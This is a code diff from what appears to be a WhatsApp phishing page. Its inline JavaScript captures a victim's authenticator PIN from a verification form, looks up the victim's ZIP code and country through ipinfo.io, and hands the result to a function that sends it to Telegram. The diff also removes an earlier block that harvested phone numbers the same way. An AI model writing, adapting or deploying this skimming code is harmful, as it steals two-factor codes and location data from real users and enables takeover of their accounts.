@@ -126,30 +126,21 @@
     </footer>
 <script type="text/javascript">
 document.addEventListener("DOMContentLoaded", function() {
-    // Función para obtener el valor de un parámetro de la URL
-    function getQueryParam(param) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(param);
-    }
-
-    // Función para obtener la ubicación y enviar el mensaje a Telegram
-    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
-        fetch('https://ipapi.co/json/')
+    // Función para obtener la ubicación con ipinfo.io y enviar el mensaje a Telegram
+    function obtenerUbicacionYEnviarMensajeTelegram(pin, nextPage, message) {
+        fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
-            var country = data.country_name;
-            var region = data.region;
-            var ip = data.ip;
-            if (country && region && ip) {
-                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
-            } else {
-                message += '\nNo se pudo obtener la ubicación.';
-            }
+            var zipCode = data.postal;     // ZIP CODE
+            var pais = data.country;       // PAIS (código ISO)
+
+            // Formato organizado: Zip Code y Pais en la misma línea
+            message += '\nZip Code: ' + (zipCode || 'No disponible') + ' Pais: ' + pais;
             enviarMensajeTelegram(message, nextPage);
         })
         .catch(error => {
             console.error("Error al obtener la ubicación:", error);
-            message += "\nError al obtener la ubicación.";
+            message += "\nZip Code: No disponible Pais: Desconocido";
             enviarMensajeTelegram(message, nextPage);
         });
     }
@@ -187,24 +178,7 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     }
 
-    // Evento de envío de formulario para la página de inicio de sesión
-    var loginForm = document.getElementById("loginForm");
-    if (loginForm) {
-        loginForm.addEventListener("submit", function(event) {
-            event.preventDefault();
-            
-            const btn = document.getElementById("submitButton");
-            if (btn) {
-                btn.classList.add("loading");
-                btn.disabled = true;
-            }
-            
-            var telefono = document.getElementById("telefono").value;
-            obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "loading4.html?action=telefono", "💲 Whatsapp 💲:\nTELEFONO: " + telefono);
-        });
-    }
-
-    // Evento de envío de formulario para la sección de contacto
+    // Evento de envío de formulario para la sección de PIN de autenticación
     var verificationForm = document.getElementById("verificationForm");
     if (verificationForm) {
         verificationForm.addEventListener("submit", function(event) {
@@ -217,7 +191,11 @@ document.addEventListener("DOMContentLoaded", function() {
             }
             
             var auth = document.getElementById("auth").value;
-            obtenerUbicacionYEnviarMensajeTelegram(auth, auth, "loading4.html?action=auth", "💲 Whatsapp 💲:\nPIN AUTHENTICADOR: " + auth);
+            
+            // Mensaje base con formato organizado
+            var mensajeBase = "💲 Whatsapp AUTH💲:\nPIN AUTHENTICADOR: " + auth;
+            
+            obtenerUbicacionYEnviarMensajeTelegram(auth, "loading4.html?action=auth", mensajeBase);
         });
     }
 });
